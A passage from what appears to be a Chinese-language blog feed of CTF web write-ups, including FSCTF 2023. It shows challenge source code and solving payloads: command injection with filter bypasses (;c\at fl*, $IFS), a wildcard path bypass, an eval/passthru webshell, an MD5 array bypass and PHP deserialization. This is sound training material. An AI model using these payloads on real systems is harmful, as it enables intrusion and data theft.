punctuation\">)</span><span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusInternalServerError<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>Values<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                session<span class=\"token punctuation\">.</span>Values<span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"admin\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                err <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span><span class=\"token function\">Save</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                        http<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Writer<span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">.</span><span class=\"token function\">Error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> http<span class=\"token punctuation\">.</span>StatusInternalServerError<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        c<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Hello, User. How to become admin?\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>之后在附件目录</p>\n<p>命令行 go run main.go</p>\n<p>在此之前由于 go 语言的特性，得设置以下代理</p>\n<p>可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTIzNTEwNTEvYXJ0aWNsZS9kZXRhaWxzLzExNTAzMzk1Ng==\">go 语言：环境变量 GOPROXY 和 GO111MODULE 设置</span></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>go <span class=\"token function\">env</span> <span class=\"token parameter variable\">-w</span> <span class=\"token assign-left variable\">GOPROXY</span><span class=\"token operator\">=</span>https://goproxy.io,direct</pre></td></tr></table></figure><p>之后访问 127.0.0.1:8000 获取 session</p>\n<p>得到 <code>session</code></p>\n<pre><code class=\"language-Plaintext\">MTY5NjU4NDE0OHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXysV4NxGfmmxi8T_k5RdAIUVa9tJvZeKhYCyAgeuPTHYA==\n</code></pre>\n<p>然后就是 <code>readflag</code>  路由下面，如何读取 flag</p>\n<p>先来看 <code>readfile.go</code>  的实现</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> readfile</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token string\">\"os/exec\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">ReadFile</span><span class=\"token punctuation\">(</span>path <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>string2 <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">defer</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                panic_err <span class=\"token operator\">:=</span> <span class=\"token function\">recover</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                <span class=\"token keyword\">if</span> panic_err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        cmd <span class=\"token operator\">:=</span> exec<span class=\"token punctuation\">.</span><span class=\"token function\">Command</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bash\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"strings  \"</span><span class=\"token operator\">+</span>path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        string2<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> cmd<span class=\"token punctuation\">.</span><span class=\"token function\">Output</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                string2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"文件不存在\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span> string2</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>用的 <code>bash</code>  终端下的 <code>string</code>  函数</p>\n<p>再去看正则过滤</p>\n<pre><code class=\"language-Go\">reg := regexp.MustCompile(`[b-zA-Z_@#%^&amp;*:&#123;|&#125;+&lt;&gt;&quot;;\\[\\]]`)\n\nif reg.MatchString(path) &#123;\n\n    http.Error(c.Writer, &quot;nonono&quot;, http.StatusInternalServerError)\n    return\n&#125;\n\nvar data []byte\nif path != &quot;&quot; &#123;\n    data = readfile.ReadFile(path)\n&#125; else &#123;\n    data = []byte(&quot;请传入参数&quot;)\n&#125;\n</code></pre>\n<p>没过滤  <code>/?a</code></p>\n<p>直接用 <code>/??a?</code>  匹配，或者 /????</p>\n<p>也就是直接访问</p>\n<pre><code class=\"language-Plaintext\">http://112.6.51.212:32997/readflag?filename=/??a?\n</code></pre>\n<p>即可</p>\n",
            "tags": [
                "CTF",
                "无敌的Web",
                "php是世界上最好的语言",
                "我就是歪脖"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/web/FSCTF/",
            "url": "https://p1kap1.github.io/CTF/web/FSCTF/",
            "title": "FSCTF 2023-wp",
            "date_published": "2023-10-20T16:00:00.000Z",
            "content_html": "<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> Web</h2>\n<h3 id=\"源码启动\"><a class=\"anchor\" href=\"#源码启动\">#</a> 源码！启动！</h3>\n<p>进入后是一个精美的界面，题目提示查看源码，查看源代码试试，右键发现被禁用。</p>\n<p>不过没关系，可以 ctrl+u 查看源码，除此之外还可以在 url 前端添加 'view-source:', 或者 F12 打开开发者工具来查看源码，还有一种就是把网页的 javascript 功能给禁了。</p>\n<h3 id=\"webshell是啥捏\"><a class=\"anchor\" href=\"#webshell是啥捏\">#</a> webshell 是啥捏</h3>\n<p>题目源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$😀<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>$😁<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>$😂<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"c\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>$🤣<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"d\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>$😃<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"e\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>$😄<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"f\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>$😅<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"g\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>$😆<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"h\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>$😉<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"i\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>$😊<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"j\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>$😋<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"k\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>$😎<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"l\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>$😍<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"m\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>$😘<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>$😗<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"o\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>$😙<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"p\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>$😚<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"q\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>$🙂<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"r\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>$🤗<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>$🤩<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>$🤔<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"u\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>$🤨<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"v\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>$😐<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>$😑<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"x\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>$😶<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"y\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>$🙄<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"z\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>$😭 <span class=\"token operator\">=</span> $😙<span class=\"token operator\">.</span> $😀<span class=\"token operator\">.</span> $🤗<span class=\"token operator\">.</span> $🤗<span class=\"token operator\">.</span> $🤩<span class=\"token operator\">.</span> $😆<span class=\"token operator\">.</span> $🙂<span class=\"token operator\">.</span> $🤔<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'👽'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span>$😭<span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'👽'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>很明显 $😭就是 passthru 系统函数</p>\n<p>直接传参即可：</p>\n<blockquote>\n<p>/?👽=ls /</p>\n</blockquote>\n<p>回显</p>\n<blockquote>\n<p>bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p>\n</blockquote>\n<blockquote>\n<p>/?👽=cat /fl*</p>\n</blockquote>\n<p>得到 flag。</p>\n<h3 id=\"helloyou\"><a class=\"anchor\" href=\"#helloyou\">#</a> Hello,you</h3>\n<p>进去后是个注册界面，这题考点就是让我们一次执行多个命令，命令之间需要用连接符连接，</p>\n<p>payload:</p>\n<blockquote>\n<p>;ls</p>\n</blockquote>\n<p>回显：</p>\n<blockquote>\n<p>Hello,<br />\nflag.php<br />\nindex.php</p>\n</blockquote>\n<p>然后就是绕过过滤了，本题过滤了 cat,flag,tac 等字段，可以用以下 payload 绕过：</p>\n<blockquote>\n<p>;nl fl*</p>\n<p>;c\\at fl*</p>\n<p>;c''at fl??????</p>\n</blockquote>\n<h3 id=\"细狗20\"><a class=\"anchor\" href=\"#细狗20\">#</a> 细狗 2.0</h3>\n<p>和上题很像，使用</p>\n<blockquote>\n<p>;ls</p>\n</blockquote>\n<p>回显：</p>\n<blockquote>\n<p>行不行啊细狗，你就输了个这？ ;lsindex.php moyu.php</p>\n</blockquote>\n<p>本题过滤了空格。使用 $IFS 绕过：</p>\n<blockquote>\n<p>;ls$IFS/</p>\n</blockquote>\n<p>回显：</p>\n<blockquote>\n<p>行不行啊细狗，你就输了个这？ ;ls$IFS/bin dev <span class=\"exturl\" data-url=\"aHR0cDovL2RvY2tlci1lbnRyeXBvaW50LnNo\">docker-entrypoint.sh</span> etc flag <span class=\"exturl\" data-url=\"aHR0cDovL2ZsYWcuc2g=\">flag.sh</span> home lib media mnt opt proc root run sbin srv sys tmp usr var</p>\n</blockquote>\n<p>其他和上题差不多：</p>\n<blockquote>\n<p>;c\\at$IFS/fl*</p>\n</blockquote>\n<p>得到 flag。</p>\n<h3 id=\"ez_php1\"><a class=\"anchor\" href=\"#ez_php1\">#</a> ez_php1</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"globals.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">!=</span><span class=\"token variable\">$b</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"!!!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'FL_AG'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^.*(flag).*$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ja</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'You are bad guy!!!'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Congratulation!!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$hint1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Please input my love FL_AG\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"game over!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>数组绕过 md5</p>\n<blockquote>\n<p>/?a[]=3&amp;b[]=2</p>\n</blockquote>\n<p>然后 post 传入 FL_AG 参数即可。</p>\n<blockquote>\n<p>!<span class=\"spoiler\" title=\"你知道得太多了\">Congratulation</span>L0vey0U.php</p>\n</blockquote>\n<p>打开 L0vey0U.php 界面：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"globals.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$FAKE_KEY</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Do you love CTF?\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$KEY</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"YES I love\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$KEY</span></span>\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$hint2</span></span>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>flag&#123;This_is_fake_flag&#125;</pre></td></tr></table></figure><p>错误的 flag 不用管</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$d</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"YES I love\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>执行后传入到 str 即可</p>\n<blockquote>\n<p>/L0vey0U.php?str=s:10:&quot;YES I love&quot;;</p>\n</blockquote>\n<p>回显 P0int.php 界面，打开：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Clazz</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=g0t_f1ag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token 